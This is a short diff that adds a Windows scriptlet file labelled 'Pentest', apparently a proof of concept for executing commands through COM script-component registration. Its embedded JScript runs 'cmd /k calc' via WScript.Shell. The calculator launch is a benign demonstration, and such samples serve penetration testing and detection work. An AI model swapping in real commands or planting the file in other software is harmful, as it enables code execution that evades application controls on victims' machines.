@@ -1,0 +1,14 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration         
+progid="Pentest"       
+classid="{0000f35c-0000-0000-0000-53f1dabbf371}" >
+<script language="JScript">
+ 
+<![CDATA[   
+var r = new ActiveXObject("WScript.Shell").Run("cmd /k calc"); 
+]]>
+ 
+</script>
+</registration>
+</scriptlet>
